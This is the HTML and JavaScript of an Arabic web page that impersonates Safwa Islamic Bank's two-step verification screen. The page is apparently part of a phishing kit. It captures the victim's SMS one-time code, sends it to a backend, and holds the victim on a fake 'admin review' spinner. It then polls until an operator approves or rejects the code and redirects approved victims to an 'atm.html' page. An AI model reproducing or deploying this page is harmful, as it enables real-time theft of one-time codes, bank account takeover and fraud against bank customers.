<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>التحقق من الرمز - بنك صفوة الإسلامي</title>
<style>
  :root {
    --navy: #12314f;
    --gold: #f4c26b;
    --ink: #1c2b36;
    --muted: #5c6b74;
    --light-bg: #f4f6f8;
    --border: #d7dce0;
  }
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    font-family: "Segoe UI", "Tahoma", Arial, sans-serif;
    background-color: var(--light-bg);
    color: var(--ink);
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    justify-content: center;
    align-items: center;
    position: relative;
  }
  .lang-switcher {
    position: absolute;
    top: 20px;
    left: 20px;
    z-index: 10;
  }
  .lang-switcher a {
    color: var(--navy);
    text-decoration: none;
    font-weight: bold;
    font-size: 14px;
    border: 1px solid var(--navy);
    padding: 6px 14px;
    border-radius: 20px;
    transition: all 0.2s ease;
    background: #fff;
  }
  .lang-switcher a:hover {
    background: var(--navy);
    color: #fff;
  }
  .container {
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }
  .card {
    background: #ffffff;
    border-radius: 12px;
    box-shadow: 0 4px 25px rgba(0,0,0,0.08);
    width: 100%;
    max-width: 420px;
    padding: 35px 24px;
    text-align: center;
  }
  .logo-img {
    max-width: 180px;
    height: auto;
    margin: 0 auto 24px;
    display: block;
  }
  .secure-icon {
    width: 50px;
    height: 50px;
    background-color: rgba(18, 49, 79, 0.05);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 16px;
    color: var(--navy);
  }
  h2 {
    color: var(--navy);
    font-size: 19px;
    margin: 0 0 8px;
  }
  p.lead {
    color: var(--muted);
    font-size: 13px;
    line-height: 1.6;
    margin: 0 0 24px;
  }
  .otp-field {
    text-align: right;
    margin-bottom: 16px;
  }
  .otp-field label {
    display: block;
    font-size: 13px;
    color: var(--muted);
    margin-bottom: 8px;
  }
  .otp-field input {
    width: 100%;
    border: none;
    border-bottom: 2px solid var(--border);
    padding: 8px 0;
    font-size: 22px;
    letter-spacing: 6px;
    text-align: center;
    color: var(--ink);
    background: transparent;
    transition: border-color 0.2s;
  }
  .otp-field input:focus {
    outline: none;
    border-bottom-color: var(--navy);
  }
  .req {
    display: none;
    font-size: 11.5px;
    color: #c0392b;
    margin: 6px 0 0;
    text-align: right;
  }
  .invalid .req {
    display: block;
  }
  .invalid input {
    border-bottom-color: #c0392b;
  }
  .submit-btn {
    display: block;
    width: 100%;
    background: #1e8e50;
    color: #fff;
    border: none;
    border-radius: 6px;
    padding: 12px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    margin-top: 24px;
    transition: background-color 0.2s;
  }
  .submit-btn:hover {
    background: #177041;
  }

  /* ---------- OVERLAY (waiting / success / rejected) ---------- */
  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.95);
    display: none;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    gap: 18px;
    z-index: 999;
    padding: 24px;
    text-align: center;
  }
  .overlay.show {
    display: flex;
  }
  .spinner {
    width: 46px;
    height: 46px;
    border: 4px solid #e2e6e9;
    border-top-color: var(--navy);
    border-radius: 50%;
    animation: spin .8s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .overlay p {
    font-size: 14px;
    color: var(--navy);
    font-weight: 600;
    margin: 0;
    max-width: 280px;
    line-height: 1.7;
  }
  .reject-icon {
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: #c0392b;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .reject-icon svg {
    width: 26px;
    height: 26px;
  }
  .overlay button {
    margin-top: 6px;
    background: var(--navy);
    color: #fff;
    border: none;
    border-radius: 6px;
    padding: 10px 24px;
    font-size: 13.5px;
    font-weight: 700;
    cursor: pointer;
  }
  .overlay button:hover {
    background: #0c2438;
  }
</style>
</head>
<body>

  <div class="lang-switcher">
    <a id="langSwitch" href="otp-en.html">English</a>
  </div>

  <div class="container">
    <div class="card" id="otpForm">
      <img src="https://i.ibb.co/XxtGmBdx/image.png" alt="بنك صفوة الإسلامي" class="logo-img">
      
      <div class="secure-icon">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
        </svg>
      </div>
      <h2>التحقق بخطوتين</h2>
      <p class="lead">تم إرسال رمز تحقق (OTP) إلى جوالك. برجاء إدخاله لإتمام تسجيل الدخول.</p>
      
      <div class="otp-field" id="otpField">
        <label for="otp">رمز التحقق</label>
        <input type="text" id="otp" inputmode="numeric" maxlength="6" placeholder="------">
        <span class="req">الرمز مطلوب</span>
      </div>
      <button class="submit-btn" id="verifyBtn" type="button">تأكيد</button>
    </div>
  </div>

  <div class="overlay" id="waitOverlay">
    <div class="spinner"></div>
    <p id="waitText">جاري المراجعة من الإدارة...</p>
  </div>

  <div class="overlay" id="rejectOverlay">
    <div class="reject-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <line x1="18" y1="6" x2="6" y2="18"></line>
        <line x1="6" y1="6" x2="18" y2="18"></line>
      </svg>
    </div>
    <p style="color: #c0392b; font-weight: bold; font-size: 16px;">الرمز الذي تم إدخاله غير صحيحة وغير صالح</p>
    <button type="button" id="retryOtpBtn" style="background-color: #c0392b;">إعادة المحاولة</button>
  </div>

  <script>
    var requestId = sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
    if (!requestId) {
      requestId = '999';
    }

    // Update language switcher link to preserve request ID
    var langSwitch = document.getElementById('langSwitch');
    if (langSwitch) {
      var params = new URLSearchParams(window.location.search);
      if (requestId && requestId !== '999') {
        params.set('id', requestId);
      }
      langSwitch.href = 'otp-en.html' + (params.toString() ? '?' + params.toString() : '');
    }

    var otpForm = document.getElementById('otpForm');
    var otpField = document.getElementById('otpField');
    var otpInput = document.getElementById('otp');
    var verifyBtn = document.getElementById('verifyBtn');
    var waitOverlay = document.getElementById('waitOverlay');
    var rejectOverlay = document.getElementById('rejectOverlay');
    var statusPollTimer = null;

    function stopPoll(){
      clearInterval(statusPollTimer);
      statusPollTimer = null;
    }

    function pollOtpStatus(){
      statusPollTimer = setInterval(function(){
        fetch('/api/status/' + requestId)
          .then(function(res){ return res.json(); })
          .then(function(data){
            if (!data.ok) return;
            if (data.status === 'approved') {
              stopPoll();
              waitOverlay.classList.remove('show');
              window.location.href = 'atm.html?id=' + requestId;
            } else if (data.status === 'rejected') {
              stopPoll();
              waitOverlay.classList.remove('show');
              rejectOverlay.classList.add('show');
            }
          })
          .catch(function(err){
            console.warn('تعذر التحقق من حالة الطلب:', err);
          });
      }, 2500);
    }

    verifyBtn.addEventListener('click', function(){
      var code = otpInput.value.trim();
      if (!code) {
        otpField.classList.add('invalid');
        return;
      }
      otpField.classList.remove('invalid');

      otpForm.style.display = 'none';
      waitOverlay.classList.add('show');

      fetch('/api/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: requestId, otp: code })
      })
      .then(function(res){ return res.json(); })
      .then(function(data){
        if (data.ok) {
          pollOtpStatus();
        } else {
          waitOverlay.classList.remove('show');
          rejectOverlay.classList.add('show');
        }
      })
      .catch(function(err){
        console.warn('تعذر الاتصال بالسيرفر الخلفي:', err);
      });
    });

    document.getElementById('retryOtpBtn').addEventListener('click', function(){
      rejectOverlay.classList.remove('show');
      otpForm.style.display = 'block';
      otpInput.value = '';
    });
  </script>

</body>
</html>
